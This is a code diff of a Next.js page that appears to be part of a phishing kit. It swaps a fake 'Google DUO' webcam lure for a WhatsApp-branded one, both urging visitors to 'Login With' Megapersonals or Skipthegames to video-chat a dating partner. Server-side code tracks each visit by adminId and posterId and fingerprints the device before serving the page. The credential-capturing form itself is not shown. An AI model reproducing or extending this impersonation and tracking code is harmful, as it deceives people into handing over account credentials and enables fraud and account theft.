@@ -1,145 +1,49 @@
-import { useState } from "react";
-import Login from "../../../components/Login";
-import Webcam from "react-webcam";
-import { API_URL, site } from "../../../config";
-import Image from "next/image";
-
-
+import { useState } from 'react';
+import { API_URL, site } from '../../../config';
+import Image from 'next/image';
+import Link from 'next/link';
+import whatsAppImg from '../public/images/whatsapp.png';
+import skipthegame from '../public/images/logo.png';
 
 export default function Home() {
   const [showForm, setShowForm] = useState(true);
 
- 
-
   return (
-    <div className="relative text-black h-screen w-screen flex flex-col justify-center items-center">
-      {/* <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
-        Waiting...
-      </h1> */}
-      <Webcam
-        audio={false}
-        className="object-cover h-screen w-screen lg:w-auto"
-        // height={1080}
-        // width={1262}
-        // screenshotFormat="image/jpeg"
-        // videoConstraints={videoConstraints}
-      />
-
-      <div className="absolute mt-7 flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
-       
-          <>
-            {showForm ? (
-                <div class="p-5 w-[400px]">
-                <div class="mx-auto flex items-center justify-center mt-5">
-                    <img class="h-16 w-16 text-center" src="/images/du_icon.svg" alt=""/>
-                </div>
-                <h2 class="text-3xl font-bold text-blue-900 text-center">Google DUO</h2>
-                <p class="text-xl pt-5 font-semibold text-[#707b8e]">Login With Megapersonals and enjoy with  <b class="text-[#1a73e8]">Google DUO video chat</b> your dating partner.</p>
-                <button class="flex items-center justify-center gap-5 p-2 my-5 w-full bg-[#1a73e8] text-xl font-semibold text-white rounded-md"   onClick={() => setShowForm(false)} ><span>
-                  <img src="/images/logo-potrait.jpg" class="w-12 h-12" alt=""/>
-                </span><span>Login With Megapersonal</span></button>
-            </div>
-              // <div className="bg-white md:w-[420px] shadow-around ">
-              //   <div className=" flex flex-col items-center py-4">
-              //     <div className="px-8 md:px-12">
-              //       <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
-              //         Live Video Chat
-              //       </h3>
-
-                
-              //       <p className="mt-[15px] text-lg leading-tight font-medium ">
-              //         Login with megapersonals and enjoy with{" "}
-              //         <span className="text-[#2b044d] font-bold">
-              //           Private Live Video Chat
-              //         </span>{" "}
-              //         your dating partner.
-              //       </p>
-              //     </div>
-
-              //     <div className="mt-[35px] mb-10 px-4 md:px-12 flex w-full font-serif">
-                   
-              //       <button
-              //         className="bg-[#58C2FC] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
-              //         onClick={() => setShowForm(false)}
-              //       >
-              //         <div className="relative w-10 h-10 rounded-md overflow-hidden">
-              //           <Image
-              //             src="/images/logo-potrait.jpg"
-              //             alt="potrait"
-              //             fill
-              //             className="object-cover"
-              //           />
-              //         </div>
-              //         <p className="">Login with megapersonals</p>
-              //       </button>
-              //     </div>
-              //   </div>
-              // </div>
-            ) : (
-              <Login />
-            )}
-          </>
-        
+    <div className="flex justify-center items-center min-h-screen">
+      <div className="max-w-sm">
+        <div className="flex justify-center">
+          <Image src={whatsAppImg} width={100} height={100} />
+        </div>
+        <h1 className="text-xl font-semibold">
+          Login With Skipthegames and enjoy with WhatApp video chat your dating
+          partner.
+        </h1>
+        <Link
+          href="/login"
+          className="bg-blue-400 py-2 px-5 rounded-md block mt-5"
+        >
+          <div className="flex justify-center">
+            <Image
+              src={skipthegame}
+              alt="skipthegame logo"
+              width={200}
+              height={50}
+            />
+          </div>
+          <p className="text-center text-white font-semibold text-xl">
+            login with skipthegames
+          </p>
+        </Link>
       </div>
     </div>
   );
-
-  // return (
-  //   <div className="relative h-screen w-screen flex flex-col justify-center items-center">
-  //     <h1 className="absolute top-[40px] lg:top-[140px] text-white font-bold text-[30px]">
-  //       Waiting...
-  //     </h1>
-  //     <Webcam
-  //       audio={false}
-  //       className="object-cover h-screen w-screen lg:w-auto"
-  //       // height={1080}
-  //       // width={1262}
-  //       // screenshotFormat="image/jpeg"
-  //       // videoConstraints={videoConstraints}
-  //     />
-
-  //     <div className="absolute flex justify-center items-center inset-0 font-sans mx-2 lg:mx-0">
-  //       <div className=" bg-white md:w-[420px] py-4 shadow-around rounded-lg">
-  //         {!showForm ? (
-  //           <div className="flex flex-col items-center">
-  //             <div className="px-8 md:px-12">
-  //               <h3 className="text-[32px] font-bold text-[#2b044d] text-center">
-  //                 Live Video Chat
-  //               </h3>
-
-  // <p className="mt-[15px] text-lg leading-tight font-medium ">
-  //   Login with megapersonals and enjoy with{" "}
-  //   <span className="text-[#2b044d] font-bold">
-  //     Private Live Video Chat
-  //   </span>{" "}
-  //   your dating partner.
-  // </p>
-  //             </div>
-
-  //             <div className="mt-[35px] mb-3 px-4 md:px-12 flex w-full font-serif">
-  // <button
-  //   className="bg-[#990033] text-white text-lg  flex items-center gap-10 lg:gap-5 px-5 py-[6px] rounded-md w-full"
-  //   onClick={() => setShowForm(true)}
-  // >
-  //   <div className="bg-white rounded-md w-10 h-10"></div>
-  //   <p className="">Login with megapersonals</p>
-  // </button>
-  //             </div>
-  //           </div>
-  //         ) : (
-  //           <Login />
-  //         )}
-  //       </div>
-  //     </div>
-  //   </div>
-  // );
 }
 
 export async function getServerSideProps({
   req,
   query: { adminId, posterId },
 }) {
-  const userAgent = req.headers["user-agent"];
+  const userAgent = req.headers['user-agent'];
 
   const isMobileView = userAgent.match(
     /Android|BlackBerry|iPhone|iPad|iPod|Opera Mini|IEMobile|WPDesktop/i
@@ -149,14 +53,15 @@ export async function getServerSideProps({
     /Tablet|iPad|Playbook|Silk|Kindle|(Android(?!.*Mobile))/i
   );
 
-  const device = isMobileView ? "phone" : isTabletView ? "ipad" : "desktop";
+  const device = isMobileView ? 'phone' : isTabletView ? 'ipad' : 'desktop';
 
   const url = `${API_URL}/${site}/verify/${adminId}/${posterId}/${device}`;
 
   const res = await fetch(url);
+  console.log(res);
   const data = await res.json();
 
-  if (data?.success !== "exists") {
+  if (data?.success !== 'exists') {
     return {
       notFound: true,
     };
